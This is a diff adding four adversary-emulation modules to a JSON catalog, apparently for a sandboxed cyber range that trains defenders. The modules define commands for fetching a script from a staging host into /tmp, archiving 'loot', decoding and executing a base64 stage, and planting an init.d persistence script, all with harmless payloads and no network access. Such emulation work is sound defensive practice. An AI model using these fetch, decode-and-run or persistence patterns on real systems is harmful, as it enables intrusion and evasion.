@@ -828,5 +828,147 @@
       ]
     },
     "signed": true
+  },
+  {
+    "id": "CR-MOD-INGRESS-001",
+    "name": "Ingress tool transfer from staging host",
+    "version": "1.0.0",
+    "technique_ids": [
+      "T1105"
+    ],
+    "tactic": "Command & Control",
+    "platform": "linux",
+    "safety_class": "S1",
+    "approval": "Security content reviewer",
+    "inputs": {
+      "source": "hostname"
+    },
+    "preconditions": [
+      "Range READY",
+      "webapp target reachable"
+    ],
+    "timeout_seconds": 60,
+    "expected_telemetry": [
+      "outbound fetch to internal host",
+      "new file in /tmp"
+    ],
+    "cleanup": "Remove transferred file from /tmp.",
+    "detection_notes": "Blue should see a fetch from the victim to an internal host followed by a new file written under /tmp.",
+    "execution": {
+      "adapter": "docker",
+      "image": "alpine:3.19",
+      "network": "none",
+      "cmd": [
+        "sh",
+        "-c",
+        "echo '[ingress] transferring tool from staging host'; wget -qO /tmp/tool.sh -T 3 http://webapp 2>/dev/null && echo ' [+] downloaded to /tmp/tool.sh' || echo ' [-] staging host unreachable'; ls -la /tmp/tool.sh 2>/dev/null; echo '[ingress] complete'"
+      ]
+    },
+    "signed": true
+  },
+  {
+    "id": "CR-MOD-ARCHIVE-001",
+    "name": "Archive collected data for staging",
+    "version": "1.0.0",
+    "technique_ids": [
+      "T1560"
+    ],
+    "tactic": "Collection",
+    "platform": "linux",
+    "safety_class": "S1",
+    "approval": "Security content reviewer",
+    "inputs": {
+      "target_dir": "path"
+    },
+    "preconditions": [
+      "Range READY"
+    ],
+    "timeout_seconds": 60,
+    "expected_telemetry": [
+      "archive utility spawned",
+      "compressed artifact created"
+    ],
+    "cleanup": "Remove /tmp/loot and the archive.",
+    "detection_notes": "Blue should see a directory of staged files compressed into a single archive before exfil.",
+    "execution": {
+      "adapter": "docker",
+      "image": "alpine:3.19",
+      "network": "none",
+      "cmd": [
+        "sh",
+        "-c",
+        "echo '[collection] staging synthetic documents'; mkdir -p /tmp/loot; echo 'synthetic-document' > /tmp/loot/report.txt; echo 'synthetic-document' > /tmp/loot/notes.txt; echo '--- archiving collected data ---'; tar czf /tmp/loot.tar.gz -C /tmp loot 2>/dev/null && echo ' [+] created /tmp/loot.tar.gz'; ls -la /tmp/loot.tar.gz; echo '[collection] complete'"
+      ]
+    },
+    "signed": true
+  },
+  {
+    "id": "CR-MOD-DECODE-001",
+    "name": "Deobfuscate and run an encoded stage",
+    "version": "1.0.0",
+    "technique_ids": [
+      "T1140",
+      "T1204"
+    ],
+    "tactic": "Defense Evasion",
+    "platform": "linux",
+    "safety_class": "S1",
+    "approval": "Security content reviewer",
+    "inputs": {},
+    "preconditions": [
+      "Range READY"
+    ],
+    "timeout_seconds": 60,
+    "expected_telemetry": [
+      "base64 decode",
+      "decoded script executed"
+    ],
+    "cleanup": "Remove /tmp/stage.sh.",
+    "detection_notes": "Blue should see an encoded blob decoded to disk and immediately executed - a common way to hide a stage from static inspection.",
+    "execution": {
+      "adapter": "docker",
+      "image": "alpine:3.19",
+      "network": "none",
+      "cmd": [
+        "sh",
+        "-c",
+        "echo '[stager] decoding embedded stage'; echo 'ZWNobyAnW3N0YWdlXSBkZWNvZGVkIHN0YWdlIGV4ZWN1dGluZyBhcyc7IGlk' | base64 -d > /tmp/stage.sh; echo '--- decoded stage ---'; cat /tmp/stage.sh; sh /tmp/stage.sh; echo '[stager] complete'"
+      ]
+    },
+    "signed": true
+  },
+  {
+    "id": "CR-MOD-PERSIST-SVC-001",
+    "name": "Startup service persistence (benign)",
+    "version": "1.0.0",
+    "technique_ids": [
+      "T1543"
+    ],
+    "tactic": "Persistence",
+    "platform": "linux",
+    "safety_class": "S1",
+    "approval": "Security content reviewer",
+    "inputs": {},
+    "preconditions": [
+      "Range READY"
+    ],
+    "timeout_seconds": 60,
+    "expected_telemetry": [
+      "init script written",
+      "autostart entry created"
+    ],
+    "cleanup": "Remove the created init script.",
+    "detection_notes": "Blue should see a new executable init script placed in a startup directory - a foothold that survives reboot.",
+    "execution": {
+      "adapter": "docker",
+      "image": "alpine:3.19",
+      "network": "none",
+      "cmd": [
+        "sh",
+        "-c",
+        "echo '[persistence] installing startup service'; mkdir -p /etc/init.d; printf '#!/bin/sh\\necho benign-startup-marker\\n' > /etc/init.d/cr-marker && chmod +x /etc/init.d/cr-marker; echo '--- autostart entry ---'; ls -la /etc/init.d/cr-marker; echo '[persistence] complete'"
+      ]
+    },
+    "signed": true
   }
 ]
